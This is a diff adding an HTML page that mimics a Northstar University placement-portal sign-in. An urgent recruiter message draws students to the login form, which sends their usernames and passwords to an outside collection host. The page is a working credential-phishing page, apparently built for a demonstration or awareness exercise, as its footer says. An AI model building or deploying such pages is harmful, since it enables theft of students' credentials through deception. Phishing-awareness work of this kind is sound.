@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Northstar University — Placement Portal</title>
+<link rel="stylesheet" href="/static/demo.css">
+<script src="/static/demo.js" defer></script>
+</head>
+<body>
+<header class="site-header">
+  <div class="container">
+    <a class="brand" href="{{link:portal.northstar-placement.example:/}}">
+      <svg viewBox="0 0 40 40" aria-hidden="true"><rect width="40" height="40" rx="6" fill="#b8913a"/><path d="M20 6l3.6 9.4L33 16l-7.4 6 2.6 9.6L20 26.4l-8.2 5.2 2.6-9.6L7 16l9.4-.6z" fill="#141f3a"/></svg>
+      <span class="brand-name">Northstar University<span class="brand-sub">Placement cell</span></span>
+    </a>
+    <nav class="site-nav" aria-label="Main">
+      <a href="{{link:portal.northstar-placement.example:/}}">Home</a>
+      <a href="{{link:portal.northstar-placement.example:/}}#login">Student sign in</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="container">
+    <h1>Campus placements 2027</h1>
+    <p>Recruiters are reviewing profiles now. Sign in with your student account to confirm your placement interview slot.</p>
+  </div>
+</section>
+
+<main class="container">
+  <div class="grid">
+    <section class="card" id="login" aria-labelledby="login-title">
+      <h2 id="login-title">Student sign in</h2>
+      <p>Use your Northstar student account.</p>
+      <form method="post" action="https://collect.badhost.example/login">
+        <label>Email or student ID
+          <input type="text" name="username" autocomplete="username">
+        </label>
+        <label>Password
+          <input type="password" name="password" autocomplete="current-password">
+        </label>
+        <button type="submit">Sign in</button>
+      </form>
+    </section>
+    <section class="card">
+      <h2>Upcoming drives</h2>
+      <ul>
+        <li>Software engineering — 12 recruiters</li>
+        <li>Finance and consulting — 7 recruiters</li>
+      </ul>
+    </section>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <p class="demo-footer">Demonstration site — do not enter real information.</p>
+    <p class="footer-meta">Northstar University · portal.northstar-placement.example</p>
+  </div>
+</footer>
+</body>
+</html>
